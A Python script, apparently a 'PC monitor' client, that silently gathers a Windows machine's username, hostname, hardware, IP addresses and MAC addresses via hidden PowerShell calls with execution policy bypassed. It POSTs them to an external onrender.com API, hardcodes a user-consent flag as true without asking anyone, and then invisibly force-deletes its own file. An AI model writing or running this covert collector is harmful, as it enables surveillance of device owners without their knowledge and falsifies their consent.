import json
import os
import platform
import socket
import subprocess
import sys
from urllib.request import Request, urlopen

API_URL = "https://pc-monitor-api.onrender.com/api/collect"
API_KEY = "PCMONITOR_CAMBIA_ESTA_CLAVE_2026"


def ps(cmd):
    try:
        p = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True, text=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return p.stdout.strip()
    except Exception:
        return ""


def collect_report():
    username = os.environ.get("USERNAME") or os.environ.get("USER") or ""
    computer = socket.gethostname()

    cpu = ps("(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)")
    manufacturer = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)")
    model = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty Model)")
    os_name = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)")
    os_version = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Version)")
    build = ps("(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber)")
    ram_bytes = ps("(Get-CimInstance Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory)")
    ram_gb = round(int(ram_bytes) / (1024**3), 2) if ram_bytes.isdigit() else None

    disks_raw = ps("""
    Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" |
    Select-Object DeviceID,Size,FreeSpace |
    ConvertTo-Json -Compress
    """)
    try:
        disks = json.loads(disks_raw) if disks_raw else []
        if isinstance(disks, dict):
            disks = [disks]
        disks = [{
            "Unidad": d.get("DeviceID"),
            "CapacidadGB": round((d.get("Size") or 0)/(1024**3), 2),
            "LibreGB": round((d.get("FreeSpace") or 0)/(1024**3), 2)
        } for d in disks]
    except Exception:
        disks = []

    gpus_raw = ps("""
    Get-CimInstance Win32_VideoController |
    Select-Object Name,AdapterRAM,DriverVersion |
    ConvertTo-Json -Compress
    """)
    try:
        gpus = json.loads(gpus_raw) if gpus_raw else []
        if isinstance(gpus, dict):
            gpus = [gpus]
        gpus = [{
            "Nombre": g.get("Name"),
            "MemoriaMB": round((g.get("AdapterRAM") or 0)/(1024**2), 0),
            "Driver": g.get("DriverVersion")
        } for g in gpus]
    except Exception:
        gpus = []

    config_raw = ps("""
    Get-NetIPConfiguration |
    Select-Object InterfaceAlias,
        @{N='IPv4';E={@($_.IPv4Address.IPAddress)}} |
    ConvertTo-Json -Compress
    """)
    try:
        configs = json.loads(config_raw) if config_raw else []
        if isinstance(configs, dict):
            configs = [configs]
        configuracion_ip = [{
            "Adaptador": c.get("InterfaceAlias"),
            "IPv4": c.get("IPv4") if isinstance(c.get("IPv4"), list)
                    else ([c.get("IPv4")] if c.get("IPv4") else [])
        } for c in configs]
    except Exception:
        configuracion_ip = []

    adapters_raw = ps("""
    Get-NetAdapter |
    Select-Object Name,InterfaceDescription,Status,MacAddress,LinkSpeed |
    ConvertTo-Json -Compress
    """)
    try:
        adapters = json.loads(adapters_raw) if adapters_raw else []
        if isinstance(adapters, dict):
            adapters = [adapters]
        adaptadores_red = [{
            "Nombre": a.get("Name"),
            "Descripcion": a.get("InterfaceDescription"),
            "Estado": a.get("Status"),
            "MAC": a.get("MacAddress"),
            "Velocidad": a.get("LinkSpeed")
        } for a in adapters]
    except Exception:
        adaptadores_red = []

    report = {
        "NombreEquipo": computer,
        "Equipo": computer,
        "Usuario": username,
        "NombreUsuario": username,
        "NombreCompleto": "",
        "CuentaActiva": True,

        "Fabricante": manufacturer,
        "Modelo": model,
        "FabricantePC": manufacturer,
        "ModeloPC": model,

        "SistemaOperativo": os_name,
        "VersionWindows": os_version,
        "BuildWindows": build,
        "Arquitectura": platform.architecture()[0],

        "NumeroSeriePC": None,
        "Procesador": cpu,
        "FabricanteCPU": "",
        "Nucleos": os.cpu_count(),
        "Hilos": os.cpu_count(),
        "VelocidadCPU_MHz": None,

        "RAM_Total_GB": ram_gb,
        "ModulosRAM": [],

        "FabricantePlaca": "",
        "ModeloPlaca": "",
        "VersionPlaca": "",
        "NumeroSeriePlaca": None,

        "BIOS": "",
        "FabricanteBIOS": "",
        "FechaBIOS": "",

        "GPU": gpus,
        "Discos": disks,

        "IP_Publica": None,
        "Latitud": None,
        "Longitud": None,
        "PrecisionMetros": None,
        "FuenteUbicacion": None,
        "GoogleMaps": None,

        "AdaptadoresRed": adaptadores_red,
        "ConfiguracionIP": configuracion_ip,

        "Consentimiento": True
    }

    return report


def send_report():
    try:
        report = collect_report()
        data = json.dumps(report, ensure_ascii=False).encode("utf-8")

        req = Request(
            API_URL,
            data=data,
            method="POST",
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "X-API-Key": API_KEY
            }
        )

        with urlopen(req, timeout=30) as response:
            result = json.loads(response.read().decode("utf-8"))

        return result.get("success", False)

    except Exception:
        return False


def auto_eliminar():
    # Detecta la ruta absoluta del ejecutable o script en uso (.py o .exe)
    ruta_archivo = os.path.abspath(sys.argv[0])
    
    # Crea un comando en cmd que espera 2 segundos y borra el archivo permanentemente (/f /q)
    cmd_borrado = f'timeout /t 2 /nobreak > NUL & del /f /q "{ruta_archivo}"'
    
    # Lanza el proceso en segundo plano totalmente invisible
    subprocess.Popen(
        f'cmd.exe /c {cmd_borrado}',
        creationflags=subprocess.CREATE_NO_WINDOW
    )


if __name__ == "__main__":
    # 1. Realiza el envío del reporte
    send_report()
    
    # 2. Inicia la tarea en segundo plano que eliminará el archivo
    auto_eliminar()